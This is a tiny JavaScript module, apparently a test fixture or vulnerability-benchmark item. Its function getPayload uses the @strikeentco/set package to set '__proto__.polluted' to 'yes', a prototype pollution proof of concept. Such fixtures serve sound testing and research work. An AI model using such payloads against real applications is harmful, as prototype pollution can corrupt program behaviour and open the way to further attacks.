function getPayload() {
    const sset = require("@strikeentco/set");

    var obj = {};
    sset(obj, "__proto__.polluted", "yes");
    return { obj };
}

module.exports = { getPayload };